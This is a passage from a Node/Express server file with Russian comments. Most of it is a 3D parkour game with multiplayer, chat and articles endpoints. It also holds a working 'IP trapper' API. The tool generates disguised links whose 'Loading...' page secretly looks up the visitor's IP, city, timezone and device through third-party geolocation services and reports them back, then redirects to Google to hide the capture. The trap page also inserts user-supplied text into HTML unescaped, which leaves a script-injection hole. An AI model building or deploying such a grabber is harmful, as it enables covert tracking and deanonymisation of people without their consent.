            // Счётчик пройденных дорог (вычисляется на основе оси Z)
            const rawScore = Math.max(0, -playerPos.z / 4);
            document.getElementById('distanceMeter').textContent = Math.floor(rawScore) + " дор.";
        }


        // === УПРАВЛЕНИЕ И ОСЬ КАМЕРЫ (МАТЕМАТИКА БЕЗ ИНВЕРСИЙ) ===
        function setupPhysicsEvents() {
            window.addEventListener('keydown', handleKeyDown);
            window.addEventListener('keyup', handleKeyUp);
            window.addEventListener('mousemove', handleMouseMove);
        }

        function handleKeyDown(e) {
            if (e.code === 'KeyW' || e.code === 'ArrowUp') keys.w = true;
            if (e.code === 'KeyA' || e.code === 'ArrowLeft') keys.a = true;
            if (e.code === 'KeyS' || e.code === 'ArrowDown') keys.s = true;
            if (e.code === 'KeyD' || e.code === 'ArrowRight') keys.d = true;
            if (e.code === 'Space') keys.space = true;
        }

        function handleKeyUp(e) {
            if (e.code === 'KeyW' || e.code === 'ArrowUp') keys.w = false;
            if (e.code === 'KeyA' || e.code === 'ArrowLeft') keys.a = false;
            if (e.code === 'KeyS' || e.code === 'ArrowDown') keys.s = false;
            if (e.code === 'KeyD' || e.code === 'ArrowRight') keys.d = false;
            if (e.code === 'Space') keys.space = false;
        }

        function handleMouseMove(e) {
            if (document.pointerLockElement || e.buttons === 1) {
                const sens = 0.0022;
                cameraRot.yaw -= e.movementX * sens; 
                cameraRot.pitch -= e.movementY * sens; 
                cameraRot.pitch = Math.max(-Math.PI / 2.05, Math.min(Math.PI / 2.05, cameraRot.pitch));
            }
        }

        function respawnPlayer() {
            playerPos = { x: 0, y: currentGameMode === 'parkour' ? 1.5 : 0, z: 0 };
            playerVelocity = { x: 0, y: 0, z: 0 };
            cameraRot = { pitch: 0, yaw: 0 };
            if (isGameActive) {
                if (currentGameMode === 'parkour' && platforms.length > 30) {
                    resetInfiniteMap();
                } else if (currentGameMode === 'crosswalk' && roads.length > 25) {
                    resetCrosswalkMap();
                }
            }
        }

        function updatePlayerPhysics(dt) {
            playerVelocity.y += gravity * dt;

            let moveX = 0;
            let moveZ = 0;

            if (!isTouchDevice) {
                if (keys.w) moveZ -= 1;
                if (keys.s) moveZ += 1;
                if (keys.a) moveX -= 1;
                if (keys.d) moveX += 1;
            } else {
                moveX = touchMoveVector.x;
                moveZ = touchMoveVector.z;
            }

            const sin = Math.sin(cameraRot.yaw);
            const cos = Math.cos(cameraRot.yaw);
            
            let worldMoveX = moveX * cos + moveZ * sin;
            let worldMoveZ = -moveX * sin + moveZ * cos;

            const length = Math.sqrt(worldMoveX * worldMoveX + worldMoveZ * worldMoveZ);
            if (length > 0) {
                worldMoveX = (worldMoveX / length) * moveSpeed;
                worldMoveZ = (worldMoveZ / length) * moveSpeed;
            }

            playerPos.x += worldMoveX * dt;
            playerPos.z += worldMoveZ * dt;
            playerPos.y += playerVelocity.y * dt;

            isGrounded = false;
            const playerHeight = 1.3;
            const playerRadius = 0.38;

            platforms.forEach(p => {
                const minX = p.x - p.w/2 - playerRadius;
                const maxX = p.x + p.w/2 + playerRadius;
                const minZ = p.z - p.d/2 - playerRadius;
                const maxZ = p.z + p.d/2 + playerRadius;

                if (playerPos.x > minX && playerPos.x < maxX && playerPos.z > minZ && playerPos.z < maxZ) {
                    const platformTop = p.y + p.h/2;
                    if (playerPos.y - playerHeight <= platformTop && playerPos.y - playerHeight >= platformTop - 0.75) {
                        if (playerVelocity.y <= 0) {
                            playerPos.y = platformTop + playerHeight;
                            playerVelocity.y = 0;
                            isGrounded = true;
                        }
                    }
                }
            });

            if (isGrounded && (keys.space || mobileJumpPressed)) {
                playerVelocity.y = jumpStrength;
                isGrounded = false;
                mobileJumpPressed = false; 
            }

            if (playerPos.y < -18) {
                respawnPlayer();
            }
        }

        function updateCamera() {
            camera.position.set(playerPos.x, playerPos.y + (currentGameMode === 'crosswalk' ? 1.4 : 0), playerPos.z);
            
            const target = new THREE.Vector3();
            target.x = playerPos.x - Math.sin(cameraRot.yaw) * Math.cos(cameraRot.pitch);
            target.y = (playerPos.y + (currentGameMode === 'crosswalk' ? 1.4 : 0)) + Math.sin(cameraRot.pitch);
            target.z = playerPos.z - Math.cos(cameraRot.yaw) * Math.cos(cameraRot.pitch);
            
            camera.lookAt(target);
        }

        // === МОБИЛЬНЫЙ ДЖОЙСТИК (ИСПРАВЛЕНА ОСЬ КАМЕРЫ НА ТАЧЕ) ===
        let mobileJumpPressed = false;
        function setupMobileEvents() {
            const joystickBoundary = document.getElementById('joystickBoundary');
            const joystickKnob = document.getElementById('joystickKnob');
            const jumpButton = document.getElementById('jumpButton');

            jumpButton.addEventListener('touchstart', (e) => {
                e.preventDefault();
                if (currentGameMode === 'parkour') {
                    mobileJumpPressed = true;
                }
            });

            let touchStartPoint = { x: 0, y: 0 };
            window.addEventListener('touchstart', (e) => {
                for (let i = 0; i < e.touches.length; i++) {
                    if (e.touches[i].clientX > window.innerWidth / 2) {
                        touchStartPoint.x = e.touches[i].clientX;
                        touchStartPoint.y = e.touches[i].clientY;
                    }
                }
            });

            window.addEventListener('touchmove', (e) => {
                for (let i = 0; i < e.touches.length; i++) {
                    if (e.touches[i].clientX > window.innerWidth / 2) {
                        const dx = e.touches[i].clientX - touchStartPoint.x;
                        const dy = e.touches[i].clientY - touchStartPoint.y;

                        const sens = 0.005;
                        cameraRot.yaw -= dx * sens; 
                        cameraRot.pitch -= dy * sens; 
                        cameraRot.pitch = Math.max(-Math.PI / 2.05, Math.min(Math.PI / 2.05, cameraRot.pitch));

                        touchStartPoint.x = e.touches[i].clientX;
                        touchStartPoint.y = e.touches[i].clientY;
                    }
                }
            });

            joystickBoundary.addEventListener('touchstart', (e) => {
                e.preventDefault();
                joystickActive = true;
                const touch = e.touches[0];
                joystickStart.x = touch.clientX;
                joystickStart.y = touch.clientY;
            });

            joystickBoundary.addEventListener('touchmove', (e) => {
                if (!joystickActive) return;
                const touch = e.touches[0];
                const dx = touch.clientX - joystickStart.x;
                const dy = touch.clientY - joystickStart.y;
                
                const limit = 50; 
                const dist = Math.sqrt(dx*dx + dy*dy);
                
                let moveX = dx;
                let moveY = dy;
                if (dist > limit) {
                    moveX = (dx / dist) * limit;
                    moveY = (dy / dist) * limit;
                }

                joystickKnob.style.transform = \`translate(\${moveX}px, \${moveY}px)\`;
                touchMoveVector.x = moveX / limit;
                touchMoveVector.z = moveY / limit;
            });

            joystickBoundary.addEventListener('touchend', () => {
                joystickActive = false;
                joystickKnob.style.transform = 'translate(0px, 0px)';
                touchMoveVector = { x: 0, z: 0 };
            });
        }

        // РИСОВАНИЕ КРАСИВОГО СПРАЙТА-НИКНЕЙМА
        function createNicknameTexture(text) {
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 64;
            const ctx = canvas.getContext('2d');
            
            ctx.clearRect(0, 0, 256, 64);
            ctx.fillStyle = 'rgba(5, 5, 5, 0.75)';
            ctx.roundRect ? ctx.roundRect(10, 10, 236, 44, 8) : ctx.rect(10, 10, 236, 44);
            ctx.fill();

            ctx.font = 'bold 20px sans-serif';
            ctx.fillStyle = '#60a5fa'; 
            ctx.textAlign = 'center';
            ctx.fillText(text, 128, 38);

            const texture = new THREE.CanvasTexture(canvas);
            const material = new THREE.SpriteMaterial({ map: texture, transparent: true });
            const sprite = new THREE.Sprite(material);
            sprite.scale.set(1.5, 0.4, 1);
            return sprite;
        }

        function startMultiplayerLoop() {
            multiplayerInterval = setInterval(async () => {
                try {
                    const res = await fetch('/api/parkour/sync', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            nickname: myNickname,
                            x: parseFloat(playerPos.x.toFixed(2)),
                            y: parseFloat(playerPos.y.toFixed(2)),
                            z: parseFloat(playerPos.z.toFixed(2)),
                            ry: cameraRot.yaw, 
                            rx: cameraRot.pitch 
                        })
                    });
                    const serverPlayers = await res.json();
                    updateOtherPlayersData(serverPlayers);
                } catch (e) {}
            }, 100); 
        }

        function updateOtherPlayersData(serverPlayers) {
            for (const nick in otherPlayers) {
                if (!serverPlayers[nick]) {
                    scene.remove(otherPlayers[nick].group);
                    delete otherPlayers[nick];
                }
            }

            for (const nick in serverPlayers) {
                if (nick === myNickname) continue; 

                const pData = serverPlayers[nick];

                if (!otherPlayers[nick]) {
                    const group = new THREE.Group();

                    // ТЕЛО (Цилиндр)
                    const bodyGeo = new THREE.CylinderGeometry(0.3, 0.3, 1.2, 8);
                    const bodyMat = new THREE.MeshPhongMaterial({ color: 0x3b82f6, emissive: 0x1d4ed8, emissiveIntensity: 0.3 });
                    const bodyMesh = new THREE.Mesh(bodyGeo, bodyMat);
                    bodyMesh.position.y = 0.6;
                    group.add(bodyMesh);

                    // ГОЛОВА С ПОВОРОТНЫМ КОНТЕЙНЕРОМ
                    const headGroup = new THREE.Group();
                    headGroup.position.y = 1.35;

                    const headGeo = new THREE.SphereGeometry(0.28, 12, 12);
                    const headMat = new THREE.MeshPhongMaterial({ color: 0xff00ff, emissive: 0x701a75, emissiveIntensity: 0.4 });
                    const headMesh = new THREE.Mesh(headGeo, headMat);
                    headGroup.add(headMesh);

                    // ГЛАЗКИ (Смотрят вперед по оси -Z)
                    const eyeGeo = new THREE.SphereGeometry(0.06, 8, 8);
                    const eyeMat = new THREE.MeshBasicMaterial({ color: 0xffffff });
                    
                    const pupilGeo = new THREE.SphereGeometry(0.03, 8, 8);
                    const pupilMat = new THREE.MeshBasicMaterial({ color: 0x000000 });

                    const leftEye = new THREE.Group();
                    const leftWhite = new THREE.Mesh(eyeGeo, eyeMat);
                    const leftPupil = new THREE.Mesh(pupilGeo, pupilMat);
                    leftPupil.position.set(0, 0, -0.04); 
                    leftEye.add(leftWhite, leftPupil);
                    leftEye.position.set(-0.11, 0.05, -0.22); 
                    headGroup.add(leftEye);

                    const rightEye = new THREE.Group();
                    const rightWhite = new THREE.Mesh(eyeGeo, eyeMat);
                    const rightPupil = new THREE.Mesh(pupilGeo, pupilMat);
                    rightPupil.position.set(0, 0, -0.04);
                    rightEye.add(rightWhite, rightPupil);
                    rightEye.position.set(0.11, 0.05, -0.22);
                    headGroup.add(rightEye);

                    group.add(headGroup);

                    const nickSprite = createNicknameTexture(nick);
                    nickSprite.position.set(0, 1.95, 0); 
                    group.add(nickSprite);

                    scene.add(group);

                    otherPlayers[nick] = {
                        group: group,
                        headMesh: headGroup, 
                        targetPos: { x: pData.x, y: pData.y, z: pData.z },
                        targetRy: pData.ry,
                        targetRx: pData.rx
                    };
                } else {
                    otherPlayers[nick].targetPos = { x: pData.x, y: pData.y, z: pData.z };
                    otherPlayers[nick].targetRy = pData.ry;
                    otherPlayers[nick].targetRx = pData.rx;
                }
            }
        }

        function renderOtherPlayers() {
            const lerpFactor = 0.25; 
            for (const nick in otherPlayers) {
                const player = otherPlayers[nick];
                const group = player.group;

                group.position.x += (player.targetPos.x - group.position.x) * lerpFactor;
                group.position.y += (player.targetPos.y - (currentGameMode === 'crosswalk' ? 0 : 1.4) - group.position.y) * lerpFactor; 
                group.position.z += (player.targetPos.z - group.position.z) * lerpFactor;

                group.rotation.y += (player.targetRy - group.rotation.y) * lerpFactor;
                player.headMesh.rotation.x += (player.targetRx - player.headMesh.rotation.x) * lerpFactor;
            }
        }

        function onWindowResize() {
            camera.aspect = window.innerWidth / window.innerHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(window.innerWidth, window.innerHeight);
        }
    </script>
</body>
</html>
    `);
});

// === API ТРЭППЕРА IP (С ОПРЕДЕЛЕНИЕМ ГОРОДА) ===
app.post('/api/ip/create', (req, res) => {
    const id = Math.random().toString(36).substring(2, 8);
    currentTrap = {
        id: id,
        createdAt: Date.now(),
        customText: req.body.customText || ""
    };
    lastResult = null;
    res.json({ success: true, link: `${APP_URL}/t/${id}`, id });
});

app.get('/t/:id', (req, res) => {
    const id = req.params.id;
    if (!currentTrap || currentTrap.id !== id) {
        return res.send('<body style="background:#050505;color:#e5e7eb;display:flex;align-items:center;justify-content:center;height:100vh;"><h1>Ссылка устарела</h1></body>');
    }
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const customTextHtml = currentTrap.customText 
        ? `<h1 style="font-size: 2.5rem; font-weight: 800; text-align: center; max-width: 80%; text-shadow: 0 0 10px rgba(255,0,0,0.5);">${currentTrap.customText}</h1>` 
        : ``;
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Загрузка...</title><meta charset="utf-8"></head>
        <body style="background:#050505;color:#e5e7eb;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
            ${customTextHtml}
            <script>
                fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(geo => {
                    const data = { 
                        ip: geo.ip || "${ip}", 
                        device: navigator.userAgent, 
                        timezone: geo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
                        city: geo.city || "Неизвестно"
                    };
                    sendData(data);
                })
                .catch(() => {
                    fetch('https://ipinfo.io/json')
                    .then(res => res.json())
                    .then(geo => {
                        const data = { 
                            ip: geo.ip || "${ip}", 
                            device: navigator.userAgent, 
                            timezone: geo.timezone || "Не определен",
                            city: geo.city || "Неизвестно"
                        };
                        sendData(data);
                    })
                    .catch(() => {
                        sendData({ ip: "${ip}", device: navigator.userAgent, timezone: "Неизвестно", city: "Неизвестно" });
                    });
                });

                function sendData(data) {
                    const host = window.location.protocol + '//' + window.location.host;
                    fetch(host + '/api/ip/collect/${id}', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    }).then(() => {
                        if ("${currentTrap.customText}" === "") { window.location.href = "https://www.google.com"; }
                    }).catch(() => {
                        if ("${currentTrap.customText}" === "") { window.location.href = "https://www.google.com"; }
                    });
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/api/ip/collect/:id', (req, res) => {
    const id = req.params.id;
    if (currentTrap && currentTrap.id === id) {
        lastResult = {
            ip: req.body.ip,
            device: req.body.device,
            timezone: req.body.timezone,
            city: req.body.city,
            time: new Date().toLocaleTimeString()
        };
        currentTrap = null;
        res.json({ success: true });
    } else {
        res.status(404).json({ error: "NoActive" });
    }
});

app.get('/api/ip/status', (req, res) => {
    if (lastResult) res.json({ status: 'caught', data: lastResult });
    else if (currentTrap) res.json({ status: 'pending' });
    else res.json({ status: 'expired' });
});

// === API СТАТЕЙ ===
app.get('/api/articles', (req, res) => res.json(globalArticles));
app.post('/api/articles', (req, res) => {
    const { id, title, desc, content } = req.body;
    if (!title || !content) return res.status(400).json({ error: "No data" });
    const articleId = id || Math.random().toString(36).substring(2, 10);
    globalArticles.push({ id: articleId, title, desc: desc || "Без описания", content });
    res.json({ success: true });
});

// === API ЧАТА ===
app.get('/api/chat/messages', (req, res) => res.json(chatMessages));
app.post('/api/chat/send', (req, res) => {
    const { username, text, tag } = req.body;
    if(!username || !text) return res.status(400).json({ error: "Empty" });
    chatMessages.push({ username, text, tag, time: new Date().toLocaleTimeString() });
    if (chatMessages.length > 30) chatMessages.shift();
    res.json({ success: true });
});

// === API СИНХРОНИЗАЦИИ МУЛЬТИПЛЕЕРА ===
app.post('/api/parkour/sync', (req, res) => {
    const { nickname, x, y, z, rx, ry } = req.body;
    if (!nickname) return res.status(400).json({ error: "No Nick" });

    onlinePlayers[nickname] = {
        x: x || 0,
        y: y || 0,
        z: z || 0,
        rx: rx || 0, 
        ry: ry || 0, 
        lastSeen: Date.now()
    };

    res.json(onlinePlayers);
});

app.listen(PORT, () => {
    console.log(`[CtalkeP] Бесконечные 3D-игры запущены на порту: ${PORT}`);
});
